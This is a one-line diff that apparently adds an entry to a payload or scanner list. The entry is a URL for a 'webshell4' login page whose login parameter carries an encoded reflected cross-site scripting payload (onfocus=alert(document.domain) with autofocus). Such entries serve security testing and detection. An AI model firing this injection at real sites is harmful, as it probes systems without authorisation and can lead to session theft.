@@ -1,0 +1,1 @@
+/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U
